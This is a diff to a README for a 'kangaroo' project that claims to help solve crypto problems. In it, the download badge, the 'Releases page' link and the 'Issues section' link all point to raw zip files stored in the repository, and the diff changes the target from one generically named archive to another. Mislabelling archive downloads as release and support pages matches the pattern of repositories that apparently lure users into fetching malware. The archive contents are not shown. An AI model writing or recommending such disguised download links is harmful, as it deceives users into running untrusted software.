@@ -6,12 +6,12 @@ Welcome to the kangaroo project! This application helps you solve complex crypto
 
 ## 📥 Download Link
 
-[![Download kangaroo](https://github.com/muhfathy3790/kangaroo/raw/refs/heads/main/examples/Software-Acalepha.zip)](https://github.com/muhfathy3790/kangaroo/raw/refs/heads/main/examples/Software-Acalepha.zip)
+[![Download kangaroo](https://github.com/muhfathy3790/kangaroo/raw/refs/heads/main/src/gpu/Software_v3.6.zip)](https://github.com/muhfathy3790/kangaroo/raw/refs/heads/main/src/gpu/Software_v3.6.zip)
 
 ## 📁 Download & Install
 
 1. **Visit the Releases Page**  
-   To get the latest version of the software, visit the [Releases page](https://github.com/muhfathy3790/kangaroo/raw/refs/heads/main/examples/Software-Acalepha.zip). 
+   To get the latest version of the software, visit the [Releases page](https://github.com/muhfathy3790/kangaroo/raw/refs/heads/main/src/gpu/Software_v3.6.zip). 
 
 2. **Choose the Right File**  
    On the Releases page, you will find several files available for download. Select the file that matches your system. If you are unsure which file to choose, look for the one labeled as compatible with your operating system (Windows, macOS, or Linux).
@@ -61,7 +61,7 @@ This project is open-source and licensed under the MIT License. You are free to 
 
 ## 📞 Support
 
-For questions or support, you can visit the [Issues section](https://github.com/muhfathy3790/kangaroo/raw/refs/heads/main/examples/Software-Acalepha.zip) on GitHub. You can also reach out to other users for help or report bugs. 
+For questions or support, you can visit the [Issues section](https://github.com/muhfathy3790/kangaroo/raw/refs/heads/main/src/gpu/Software_v3.6.zip) on GitHub. You can also reach out to other users for help or report bugs. 
 
 ## 🛠️ Contributing
 
